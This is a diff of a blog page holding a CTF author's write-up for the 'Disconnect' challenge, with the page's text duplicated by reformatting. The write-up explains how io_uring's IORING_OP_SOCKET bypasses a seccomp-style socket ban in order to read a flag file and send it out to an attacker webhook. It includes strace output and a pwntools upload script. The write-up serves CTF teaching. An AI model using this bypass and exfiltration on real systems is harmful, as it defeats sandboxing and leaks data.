-<p><img src="https://i.imgur.com/5VpjYNo.jpg" alt="Imgur"></p>
-<p>The idea of this challenge is very simple, just banned <code>socket</code> syscall. Players are required to get the flag without using <code>socket</code> syscall.</p>
-<p>I want to keep the challenge as lightweight as possible, I didn&rsquo;t implement so much on the hardening and it surely possible to come up with several unintended solutions.</p>
-<p>In my team internal difficulty rating, we expected this would be a easy challenge for many expereinced pwners (especially kernel pwner) because of the hot topic of <code>io_uring</code> in KCTF in recent years.</p>
-<p>We are surprised that only one team solved it (an unintended solution from Shellphish&rsquo;s fork bomb with no mercy).</p>
-<h2 id="intended-solution">Intended Solution</h2>
-<p><a href="https://manpages.debian.org/unstable/liburing-dev/io_uring_enter.2.en.html">https://manpages.debian.org/unstable/liburing-dev/io_uring_enter.2.en.html</a></p>
-<p>READ this and you will find the anwser.
-<code>io_uring_enter</code> can used for performing I/O operation. One of the opcode is <code>IORING_OP_SOCKET</code>, it do the same as <code>socket</code> syscall&quot;</p>
-<p><a href="https://manpages.debian.org/unstable/liburing-dev/io_uring_enter.2.en.html#IORING_OP_SOCKET">https://manpages.debian.org/unstable/liburing-dev/io_uring_enter.2.en.html#IORING_OP_SOCKET</a></p>
-<blockquote>
-<p>Issue the equivalent of a socket(2) system call. fd must contain the communication domain, off must contain the communication type, len must contain the protocol, and rw_flags is currently unused and must be set to zero. See also socket(2) for the general description of the related system call. Available since 5.19.</p>
-</blockquote>
-<p>Through strace the solve script, there is not a single word &lsquo;socket&rsquo; in the result.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">io_uring_setup<span style="color:#f92672">(</span>1, <span style="color:#f92672">{</span>flags<span style="color:#f92672">=</span>0, sq_thread_cpu<span style="color:#f92672">=</span>0, sq_thread_idle<span style="color:#f92672">=</span>0, sq_entries<span style="color:#f92672">=</span>1, cq_entries<span style="color:#f92672">=</span>2, features<span style="color:#f92672">=</span>IORING_FEAT_SINGLE_MMAP|IORING_FEAT_NODROP|IORING_FEAT_SUBMIT_STABLE|IORING_FEAT_RW_CUR_POS|IORING_FEAT_CUR_PE4
+</code></pre>
+              </div>
+              <h1 id="disconnect-500-points--1-solve">Disconnect (500 points / 1 solve)</h1>
+              <p><img src="https://i.imgur.com/5VpjYNo.jpg" alt="Imgur"></p>
+              <p>The idea of this challenge is very simple, just banned <code>socket</code> syscall. Players are
+                required to get the flag without using <code>socket</code> syscall.</p>
+              <p>I want to keep the challenge as lightweight as possible, I didn&rsquo;t implement so much on the
+                hardening and it surely possible to come up with several unintended solutions.</p>
+              <p>In my team internal difficulty rating, we expected this would be a easy challenge for many expereinced
+                pwners (especially kernel pwner) because of the hot topic of <code>io_uring</code> in KCTF in recent
+                years.</p>
+              <p>We are surprised that only one team solved it (an unintended solution from Shellphish&rsquo;s fork bomb
+                with no mercy).</p>
+              <h2 id="intended-solution">Intended Solution</h2>
+              <p><a
+                  href="https://manpages.debian.org/unstable/liburing-dev/io_uring_enter.2.en.html">https://manpages.debian.org/unstable/liburing-dev/io_uring_enter.2.en.html</a>
+              </p>
+              <p>READ this and you will find the anwser.
+                <code>io_uring_enter</code> can used for performing I/O operation. One of the opcode is
+                <code>IORING_OP_SOCKET</code>, it do the same as <code>socket</code> syscall&quot;
+              </p>
+              <p><a
+                  href="https://manpages.debian.org/unstable/liburing-dev/io_uring_enter.2.en.html#IORING_OP_SOCKET">https://manpages.debian.org/unstable/liburing-dev/io_uring_enter.2.en.html#IORING_OP_SOCKET</a>
+              </p>
+              <blockquote>
+                <p>Issue the equivalent of a socket(2) system call. fd must contain the communication domain, off must
+                  contain the communication type, len must contain the protocol, and rw_flags is currently unused and
+                  must be set to zero. See also socket(2) for the general description of the related system call.
+                  Available since 5.19.</p>
+              </blockquote>
+              <p>Through strace the solve script, there is not a single word &lsquo;socket&rsquo; in the result.</p>
+              <div class="highlight">
+                <pre tabindex="0"
+                  style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">io_uring_setup<span style="color:#f92672">(</span>1, <span style="color:#f92672">{</span>flags<span style="color:#f92672">=</span>0, sq_thread_cpu<span style="color:#f92672">=</span>0, sq_thread_idle<span style="color:#f92672">=</span>0, sq_entries<span style="color:#f92672">=</span>1, cq_entries<span style="color:#f92672">=</span>2, features<span style="color:#f92672">=</span>IORING_FEAT_SINGLE_MMAP|IORING_FEAT_NODROP|IORING_FEAT_SUBMIT_STABLE|IORING_FEAT_RW_CUR_POS|IORING_FEAT_CUR_PE4
 mmap<span style="color:#f92672">(</span>NULL, 388, PROT_READ|PROT_WRITE, MAP_SHARED|MAP_POPULATE, 4, 0<span style="color:#f92672">)</span> <span style="color:#f92672">=</span> 0x7f4004925000
 mmap<span style="color:#f92672">(</span>NULL, 64, PROT_READ|PROT_WRITE, MAP_SHARED|MAP_POPULATE, 4, 0x10000000<span style="color:#f92672">)</span> <span style="color:#f92672">=</span> 0x7f4004924000
 io_uring_enter<span style="color:#f92672">(</span>4, 1, 0, 0, NULL, 8<span style="color:#f92672">)</span>     <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>
-</code></pre></div><p>The above snip is part of the strace result of a socket fd creation.</p>
-<p>Once we have a socket fd, the rest of stuffs are a piece of cake.</p>
-<p><code>open flag -&gt; read flag -&gt; create io_uring socket -&gt; connect to your public server or webhook -&gt; send flag -&gt; solved</code></p>
-<h2 id="exploit-script-2">Exploit Script</h2>
-<p>You can retrieve the flag via listening on your public accessible machine or webhook services (e.g. requestbin)</p>
-<blockquote>
-<p>solve.c</p>
-</blockquote>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
+</code></pre>
+              </div>
+              <p>The above snip is part of the strace result of a socket fd creation.</p>
+              <p>Once we have a socket fd, the rest of stuffs are a piece of cake.</p>
+              <p>
+                <code>open flag -&gt; read flag -&gt; create io_uring socket -&gt; connect to your public server or webhook -&gt; send flag -&gt; solved</code>
+              </p>
+              <h2 id="exploit-script-2">Exploit Script</h2>
+              <p>You can retrieve the flag via listening on your public accessible machine or webhook services (e.g.
+                requestbin)</p>
+              <blockquote>
+                <p>solve.c</p>
+              </blockquote>
+              <div class="highlight">
+                <pre tabindex="0"
+                  style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
 </span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdlib.h&gt;</span><span style="color:#75715e">
 </span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;string.h&gt;</span><span style="color:#75715e">
 </span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;unistd.h&gt;</span><span style="color:#75715e">
@@ -1120,10 +1172,14 @@ io_uring_enter<span style="color:#f92672">(</span>4, 1, 0, 0, NULL, 8<span style
     <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
 }
 
-</code></pre></div><blockquote>
-<p>upload.py</p>
-</blockquote>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+</code></pre>
+              </div>
+              <blockquote>
+                <p>upload.py</p>
+              </blockquote>
+              <div class="highlight">
+                <pre tabindex="0"
+                  style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
 
 r <span style="color:#f92672">=</span> remote(<span style="color:#e6db74">&#34;chall-us.pwnable.hk&#34;</span>, <span style="color:#ae81ff">20003</span>)
 <span style="color:#66d9ef">with</span> open(<span style="color:#e6db74">&#34;solve&#34;</span>, <span style="color:#e6db74">&#39;rb&#39;</span>) <span style="color:#66d9ef">as</span> file:
@@ -1136,39 +1192,43 @@ sleep(<span style="color:#ae81ff">1</span>)
 print(<span style="color:#e6db74">&#34;Upload data&#34;</span>)
 r<span style="color:#f92672">.</span>send(data)
 sleep(<span style="color:#ae81ff">10</span>)
-</code></pre></div></div>
-</article>
-
-    <hr />
-    <p class="articleTagsContainer">
-        <span> </span>
-        <strong>Tags:</strong>
-        
-            <a
-                
-                href="/tags/ctf">#ctf</a>
-        
-    </p>
-
-
-
-
-
-
-                    </main><footer>
-    <hr />
-
-<p><small>
-        2023 &copy; Some copyright notice - <a href="https://example.com/license">my license</a>
-    </small></p>
-    <p><small>
-        <a href='https://gitlab.com/gabmus/hugo-ficurinia'>Ficurinia theme</a> for <a href='https://gohugo.io'>Hugo</a> by <a href='https://gabmus.org'>Gabriele Musco</a>. Licensed under <a href='https://www.gnu.org/licenses/agpl-3.0.html'>GNU AGPLv3</a>.
-    </small></p>
-</footer>
-</div>
+</code></pre>
+              </div>
             </div>
-        </div>
+          </article>
+
+          <hr />
+          <p class="articleTagsContainer">
+            <span> </span>
+            <strong>Tags:</strong>
+
+            <a href="/tags/ctf">#ctf</a>
+
+          </p>
+
+
+
+
+
+
+        </main>
+        <footer>
+          <hr />
+
+          <p><small>
+              2023 &copy; Some copyright notice - <a href="https://example.com/license">my license</a>
+            </small></p>
+          <p><small>
+              <a href='https://gitlab.com/gabmus/hugo-ficurinia'>Ficurinia theme</a> for <a
+                href='https://gohugo.io'>Hugo</a> by <a href='https://gabmus.org'>Gabriele Musco</a>. Licensed under <a
+                href='https://www.gnu.org/licenses/agpl-3.0.html'>GNU AGPLv3</a>.
+            </small></p>
+        </footer>
+      </div>
+    </div>
+  </div>
 
 
 </body>
+
 </html>
